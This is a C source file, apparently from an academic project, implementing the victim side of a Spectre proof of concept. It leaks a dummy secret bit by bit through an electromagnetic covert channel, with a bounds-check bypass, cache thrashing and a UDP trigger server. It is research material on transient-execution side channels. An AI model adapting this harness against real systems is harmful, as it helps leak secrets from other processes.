// Spectre POC that extracts the secrets through an EM covert channel using
// a control flow dependency on the secret bit
//
// Last Modified: 2023-03-14
//
// Parts of this code are adapted from Transient Fail (https://transient.fail/):
// 
// Copyright (C) 2023 Jesse De Meulemeester
// Copyright (C) 2020 Graz University of Technology

#include "utils.h"
#include "gpio.h"

// Accessible data
#define DATA "data|"
// Inaccessible secret (following accessible data)
// This string was randomly generated with the only constraint that it contains
// as many zeros as ones.
#define SECRET "\x01\x36\x9b\x78\xc9\x2c\x3d\x32\xfa\x83\x50\xaf\x39\xaf\x69\x2d\x58\xd7\x38\x6a\xc1\x63\x15\xc7\x3c\x4d\x96\x61\xe1\x88\xbd\xed"

#define DATA_SECRET DATA SECRET

// Buffer to store the data
uint8_t data[128];
size_t len = (sizeof(DATA) - 1) * 8;  // 40

// The thrash buffer that will be used to thrash the cache. The size of this 
// buffer is chosen to be larger or equal to the size of the cache (4 MB). 
// The pointer to this buffer is aligned with the cache line size to ensure it
// is not placed on the same cache line as the `len` variable.
#define THRASH_BUFFER_SIZE 524288
uint64_t __attribute__ ((aligned (64))) thrash_buffer[THRASH_BUFFER_SIZE];

// Access the bit corresponding to the given bit index
// Only the first five characters (40 bits), as defined by `len' can be accessed
// architecturally
void __attribute__ ((noinline)) access_array(int bit) { 
  if (bit < len) {
    if (data[bit / 8] & (1 << (bit % 8))) {
      // nop to avoid gcc removing this branch
      asm volatile("nop");
    }
  }
}

// Thrash the cache, i.e., remove all entries from the cache by accessing a
// large number of memory locations. 
void __attribute__ ((noinline)) thrash_cache() {
  uint64_t tmp = 0;
  for (int j = 0; j < 5; ++j)
    for (int i = 0; i < THRASH_BUFFER_SIZE; ++i)
      tmp += thrash_buffer[i];
  asm volatile("mov x10, %0" : : "r"(tmp));
}

// Accesses the secret.
// This allows us to bring the secret back into the cache after thrashing the cache.
void __attribute__ ((noinline)) access_secret() {
  uint8_t tmp = 0;
  for (int i = 0; i < sizeof(SECRET); ++i)
    tmp += data[5+i];  // The secret part starts at offset 5
  asm volatile("mov x10, %0" : : "r"(tmp));
}


int main() {
  register int index;
  int option;

  // Initialize the GPIO pin
  gpio_init();
  gpio_fsel(16, OUTPUT); 

  // Initialize the data array
  memset(data, ' ', sizeof(data));
  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
  // Ensure data terminates
  data[sizeof(data) / sizeof(data[0]) - 1] = '0';

  // Initialize the UDP interface
  initSockServer(10000);

  while (1) {
    // Receive the index to access and the value to compare to from the client
    index = receive2(&option);

    switch(option) {
      case 0:
        access_array(index);

        // Signal to the oscilloscope to take a trace
        gpio_clear(16);
        break;
      case 1:
        thrash_cache();

        // After thrashing the cache, all data will be essentially removed from
        // the cache. This includes the secret string we are after. As a result,
        // we first need to bring this secret back into the cache. For simplicity,
        // this is placed right after thrashing the cache.
        access_secret();
        break;
    }

    // Echo the received contents back to indicate the packet was received
    reply();

    // Reset the GPIO pin
    gpio_set(16);
  }
}
